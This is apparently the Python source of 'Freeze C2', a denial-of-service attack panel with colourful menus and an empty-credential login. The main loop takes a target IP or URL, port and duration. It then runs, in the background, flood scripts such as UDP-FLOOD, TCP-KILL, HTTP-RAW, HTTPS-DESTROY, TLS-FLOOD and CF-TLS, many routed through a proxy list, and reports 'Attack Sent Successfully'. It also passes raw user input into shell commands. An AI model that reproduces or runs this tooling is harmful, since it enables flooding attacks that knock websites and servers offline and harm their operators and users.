import socket, random, string, threading, getpass, urllib, colorama, os, sys, time, re, requests, json, codecs
from operator import index
from colorama import Fore, Back
from requests import post
from datetime import datetime, date

telegram = "t.me/xNeonn"
author = "xNeonn"


def clear():
    os.system("cls" if os.name == "nt" else "clear")

proxys = open('script/proxy.txt').readlines()
bots = len(proxys)

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")

start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def ports():
	os.system ("clear")
	print("""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
      \x1b[38;5;196m╔═════════════════════════╗
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 21   = SFTP       \x1b[38;5;196m║\x1b[38;5;255m   \x1b[38;5;196m╭──────────────────────╮
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 22   = SSH        \x1b[38;5;196m║\x1b[38;5;255m   \x1b[38;5;196m│ \x1b[38;5;255mList of Common Ports \x1b[38;5;196m│
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 23   = TELNET     \x1b[38;5;196m║\x1b[38;5;255m   \x1b[38;5;196m│                      │
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 25   = SMTP       \x1b[38;5;196m║\x1b[38;5;255m   \x1b[38;5;196m│ \x1b[38;5;255mCác Port Thường Gặp  \x1b[38;5;196m│
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 53   = DNS        \x1b[38;5;196m║\x1b[38;5;255m   \x1b[38;5;196m╰──────────────────────╯
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 69   = TFTP       \x1b[38;5;196m║\x1b[38;5;255m
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 80   = HTTP       \x1b[38;5;196m║\x1b[38;5;255m
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 443  = HTTPS      \x1b[38;5;196m║\x1b[38;5;255m
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 3074 = XBOX       \x1b[38;5;196m║\x1b[38;5;255m
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 3389 = RDP        \x1b[38;5;196m║\x1b[38;5;255m
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 5060 = RTP        \x1b[38;5;196m║\x1b[38;5;255m
      \x1b[38;5;196m║ \x1b[38;5;255mPORT: 9307 = PLAYSTATION\x1b[38;5;196m║\x1b[38;5;255m
      \x1b[38;5;196m╚═════════════════════════╝
        
        
""")


def proxy():
	os.system ("clear")
	print("""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
        \x1b[38;5;196m╭────────────────────────────────────────────╮
        \x1b[38;5;196m│\x1b[38;5;255mGET & NO CHECK LIVE:    get-proxy \x1b[38;5;196m          │
        \x1b[38;5;196m│\x1b[38;5;255mGET & CHECK NEW PRX:    get-check\x1b[38;5;196m           │
        \x1b[38;5;196m│\x1b[38;5;255mONLY CHECK LIVE PRX:    check-proxy \x1b[38;5;196m        │
        \x1b[38;5;196m╰────────────────────────────────────────────╯\x1b[38;5;255m
        
        
""")


def scan():
	os.system ("clear")
	print("""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
        \x1b[38;5;196m╭─────────────────────────────╮
        \x1b[38;5;196m│\x1b[38;5;255mUSAGE:    scan-ports <ip> \x1b[38;5;196m   │
        \x1b[38;5;196m│\x1b[38;5;255mEXAMPLE:  scan-ports 1.1.1.1 \x1b[38;5;196m│
        \x1b[38;5;196m╰─────────────────────────────╯\x1b[38;5;255m
        
        
""")


def checkip():
	os.system ("clear")
	print("""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
        \x1b[38;5;196m╭─────────────────────────────╮
        \x1b[38;5;196m│\x1b[38;5;255mUSAGE:    checkip <ip> \x1b[38;5;196m      │
        \x1b[38;5;196m│\x1b[38;5;255mEXAMPLE:  checkip 1.1.1.1  \x1b[38;5;196m  │
        \x1b[38;5;196m╰─────────────────────────────╯\x1b[38;5;255m
        
        
""")
    

def tcp():
	os.system ("clear")
	print("""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
        \x1b[38;5;196m╭────────────────────────────────────────────╮
        \x1b[38;5;196m│\x1b[38;5;255mUSAGE:    paping <ip> <port> <time (or not)>\x1b[38;5;196m│
        \x1b[38;5;196m│\x1b[38;5;255mEXAMPLE:  paping 1.1.1.1 80 5\x1b[38;5;196m               │
        \x1b[38;5;196m╰────────────────────────────────────────────╯\x1b[38;5;255m
        
        
""")


def l7():
    os.system ("clear")

    print ("")
    print (f"""    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
                                                       
               \x1b[38;5;255mTYPE: \x1b[38;5;196m[\x1b[38;5;255mMETHOD\x1b[38;5;196m] [\x1b[38;5;255mTARGET\x1b[38;5;196m] [\x1b[38;5;255mTIME\x1b[38;5;196m]\x1b[38;5;255m
           \x1b[38;5;196m╔════════════════════════════════════╗
           \x1b[38;5;196m║  \x1b[38;5;255mLAYER 7 LIST METHOD \x1b[38;5;196m|\x1b[38;5;255m MAX 120 SEC \x1b[38;5;196m║
           \x1b[38;5;196m╚════════════════════════════════════╝\x1b[38;5;255m                                                      
          \x1b[38;5;196m[ \x1b[38;5;255mHTTP-RAW\x1b[38;5;196m ]\x1b[38;5;255m  \x1b[38;5;196m[ \x1b[38;5;255mHTTPDDOS\x1b[38;5;196m ]\x1b[38;5;255m  \x1b[38;5;196m[ \x1b[38;5;255m HTTP-V4\x1b[38;5;196m  ]\x1b[38;5;255m
          \x1b[38;5;196m[ \x1b[38;5;255mCF-TLS\x1b[38;5;196m   ]\x1b[38;5;255m  \x1b[38;5;196m[ \x1b[38;5;255mDESTROY\x1b[38;5;196m  ]\x1b[38;5;255m  \x1b[38;5;196m[ \x1b[38;5;255mTLS-FLOOD\x1b[38;5;196m ]\x1b[38;5;255m


""")


def l4():
    os.system ("clear")

    print ("")
    print (f"""    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
                                                       
             \x1b[38;5;255mTYPE: \x1b[38;5;196m[\x1b[38;5;255mMETHOD\x1b[38;5;196m] [\x1b[38;5;255mTARGET\x1b[38;5;196m] [\x1b[38;5;255mPORT\x1b[38;5;196m] [\x1b[38;5;255mTIME\x1b[38;5;196m]\x1b[38;5;255m
           \x1b[38;5;196m╔════════════════════════════════════╗
           \x1b[38;5;196m║  \x1b[38;5;255mLAYER 4 LIST METHOD \x1b[38;5;196m|\x1b[38;5;255m MAX 120 SEC \x1b[38;5;196m║
           \x1b[38;5;196m╚════════════════════════════════════╝\x1b[38;5;255m                                                      
          \x1b[38;5;196m[ \x1b[38;5;255mUDP-FLOOD\x1b[38;5;196m ]\x1b[38;5;255m  \x1b[38;5;196m[ \x1b[38;5;255m.......\x1b[38;5;196m ]\x1b[38;5;255m  \x1b[38;5;196m[ \x1b[38;5;255m.......\x1b[38;5;196m ]\x1b[38;5;255m
          \x1b[38;5;196m[ \x1b[38;5;255mTCP-KILL\x1b[38;5;196m  ]\x1b[38;5;255m  \x1b[38;5;196m[ \x1b[38;5;255m.......\x1b[38;5;196m ]\x1b[38;5;255m  \x1b[38;5;196m[ \x1b[38;5;255m.......\x1b[38;5;196m ]\x1b[38;5;255m


""")

def help():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
          \x1b[38;5;196m╭───────────────────────────────────────────╮
          \x1b[38;5;196m│    \x1b[38;5;255mL7       ► SHOW L7 METHODS             \x1b[38;5;196m│
          \x1b[38;5;196m│    \x1b[38;5;255mL4       ► SHOW L4 METHODS             \x1b[38;5;196m│
          \x1b[38;5;196m│    \x1b[38;5;255mINFO     ► SHOW IP INFO                \x1b[38;5;196m│
          \x1b[38;5;196m│    \x1b[38;5;255mPORTS    ► SHOW LIST PORT              \x1b[38;5;196m│
          \x1b[38;5;196m│    \x1b[38;5;255mPROXY    ► GET NEW PROXY               \x1b[38;5;196m│
          \x1b[38;5;196m│    \x1b[38;5;255mSCAN     ► PORT SCANNER                \x1b[38;5;196m│
          \x1b[38;5;196m│    \x1b[38;5;255mCLS      ► BACK TO MAIN                \x1b[38;5;196m│
          \x1b[38;5;196m╰───────────────────────────────────────────╯
          
          
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m


 \x1b[38;5;196mFreeze C2
 \x1b[38;5;196mWelcome - Type [  HELP  ] For Commands
 \x1b[38;5;196mTelegram: @xNeonn\x1b[38;5;255m

                      _._     _,-'""`-._      
                     (,-.`._,'(       |\`-/|
                         `-.-' \ )-`( , o o)
                               `-    \`_`"'-

""")

    while True:
        sys.stdout.write("\x1b]2;[\] Freeze C2 :: Online Users: [1] :: Owner: @xNeonn\x07")
        sin = input("\x1b[48;5;240m\x1b[38;5;15mxNeonn\x1b[38;5;196m@\x1b[38;5;15mFreeze\x1b[0m\x1b[38;5;15m\x1b[48;5;240m\x1b[0m ➤ ")
        sinput = sin.split(" ")[0]
        if sinput.lower() in ["clear", "cls"]:
            os.system("clear")
            main()
        if sinput.lower() in ["help", ".help", "Help", ".HELP"]:
           help()
        if sinput.lower() in ["l7", "L7", "Layer7", "layer7"]:
           l7()
        if sinput.lower() in ["l4", "L4", "Layer4", "layer4"]:
           l4()
        if sinput.lower() in ["ip", "info", "checkip", "checkinfo"]:
           checkip()
        if sinput.lower() in ["tcp", "paping", "tcpping", "ping"]:
           tcp()
        if sinput.lower() in ["ports"]:
        	ports()
        if sinput.lower() in ["scan", "scanner"]:
        	scan()
        if sinput.lower() in ["attack", "atk"]:
        	attack()
        if sinput.lower() in ["proxy", "proxies", "prx"]:
        	proxy()
        if sinput == "stop" or sinput == "STOP":
            os.system ("pkill screen")
            main()          

#########LAYER-7 & LAYER-4########
        elif sinput == "scan-ports":
            try:
                ip = sin.split()[1]
                os.system(f'cd script && python scan-ports.py {ip}')
            except ValueError:
                scan()
            except IndexError:
                scan()

        elif sinput == "get-proxy":
            try:
                os.system(f'cd script && python get-nocheck.py')
            except ValueError:
                proxy()
            except IndexError:
                proxy()

        elif sinput == "check-proxy":
            try:
                os.system(f'cd script && python checkproxies.py proxy.txt')
            except ValueError:
                proxy()
            except IndexError:
                proxy()

        elif sinput == "get-check":
            try:
                os.system(f'cd script && python get_checkproxies.py')
            except ValueError:
                proxy()
            except IndexError:
                proxy()

        elif sinput == "checkip":
            try:
                ip = sin.split()[1]
                os.system(f'cd script && python checkinfo.py {ip}')
            except ValueError:
                checkip()
            except IndexError:
                checkip()

        elif sinput == "paping":
            try:
                ip = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd script && python paping.py {ip} {port} {time}')
            except ValueError:
                tcp()
            except IndexError:
                tcp()


        elif sinput == "UDP-FLOOD":
            try:
                ip = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd script && screen -dm perl UDP-FLOOD.pl {ip} {port} {time}')
                os.system ("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{ip}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mUDP-FLOOD  \x1b[38;5;255m]
 
""")
            except ValueError:
                l4()
            except IndexError:
                l4()

        elif sinput == "TCP-KILL":
            try:
                ip = sin.split()[1]
                port = sin.split()[2]
                time = sin.split()[3]
                os.system(f'cd script && screen -dm python TCP-KILL.py {ip} {port} 65000 100 {time}')
                os.system ("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{ip}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mTCP-KILL  \x1b[38;5;255m]
 
""")
            except ValueError:
                l4()
            except IndexError:
                l4()

        elif sinput == "HTTP-RAW":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                if target.startswith("https://"):
                     port = 443
                else:
                     port = 80
                os.system(f'cd script && screen -dm node HTTP-RAW.js {target} {time} ua.txt')
                os.system("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{target}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mHTTP-RAW  \x1b[38;5;255m]
 
""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "DESTROY":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                if target.startswith("https://"):
                     port = 443
                else:
                     port = 80
                os.system(f'cd script && screen -dm node HTTPS-DESTROY.js {target} {time} 64 5 proxy.txt')
                os.system("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{target}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mHTTPS-DESTROY  \x1b[38;5;255m]
 
""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "HTTPDDOS":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                if target.startswith("https://"):
                     port = 443
                else:
                     port = 80
                os.system(f'cd script && screen -dm node HTTP-BYPASS.js {target} {time} 64 5 proxy.txt')
                os.system("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{target}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mHTTP-DDOS  \x1b[38;5;255m]
 
""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "FLOOD":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                if target.startswith("https://"):
                     port = 443
                else:
                     port = 80
                os.system(f'cd script && screen -dm node FLOODER.js {target} proxy.txt http {time} 64 True')
                os.system("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{target}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mFLOODER  \x1b[38;5;255m]
 
""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "TLS-FLOOD":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                if target.startswith("https://"):
                     port = 443
                else:
                     port = 80
                os.system(f'cd script && screen -dm node TLSFLOOD.js {target} {time} 64 5 proxy.txt')
                os.system("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{target}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mTLS-Flood  \x1b[38;5;255m]
 
""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "HTTP-V4":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                if target.startswith("https://"):
                     port = 443
                else:
                     port = 80
                os.system(f'cd script && screen -dm node httpv4.js {target} {time} 64 5 proxy.txt')
                os.system("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{target}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mHTTP-V4  \x1b[38;5;255m]
 
""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "CF-TLS":
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                if target.startswith("https://"):
                     port = 443
                else:
                     port = 80
                os.system(f'cd script && screen -dm node CF-TLS.js {target} {time} 5 proxy.txt')
                os.system("clear")
                print (f"""
    \x1b[38;5;255mWelcome To Freeze C2 \x1b[38;5;196m| \x1b[38;5;255mUser: 1 \x1b[38;5;196m| \x1b[38;5;255mOwner: @xNeonn \x1b[38;5;196m| \x1b[38;5;255m
    
    
    
    
   Attack Details:
      Status:     [  \x1b[38;5;46mAttack Sent Successfully  \x1b[38;5;255m]
      Target:     [  \x1b[38;5;39m{target}  \x1b[38;5;255m]
      Port:       [  \x1b[38;5;39m{port}  \x1b[38;5;255m]
      Time:       [  \x1b[38;5;39m{time}  \x1b[38;5;255m]
      Method:     [  \x1b[38;5;39mCF-TLS  \x1b[38;5;255m]
 
""")
            except ValueError:
                l7()
            except IndexError:
                l7()
                                       

def login():
	sys.stdout.write(f"\x1b]2;[\] Freeze C2 :: Online Users: [1] :: Owner: t.me/xNeonn\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = ""
	passwd = ""
	username = input("""


                                                       
        _/          _/_/      _/_/_/  _/_/_/  _/      _/   
       _/        _/    _/  _/          _/    _/_/    _/    
      _/        _/    _/  _/  _/_/    _/    _/  _/  _/     
     _/        _/    _/  _/    _/    _/    _/    _/_/      
    _/_/_/_/    _/_/      _/_/_/  _/_/_/  _/      _/       
                                                       
                                                      
                                               
                                               
   
\x1b[38;5;196m[\x1b[38;5;255mUsername\x1b[38;5;196m]\x1b[38;5;255m► """)    

	password = getpass.getpass(prompt='\x1b[38;5;196m[\x1b[38;5;255mPassword\x1b[38;5;196m]\x1b[38;5;255m► ')
	if username != user or password != passwd:
		print("\n               \033[31;47m[Are you retarded? Wrong info.]\033[0m\n\n")
		time.sleep(5)
		sys.exit(1)
	elif username == user and password == passwd:
		print("\n                    \033[37;42m[ Login Successfully ]\033[0m\n\n")

		time.sleep(2)
		main()

login()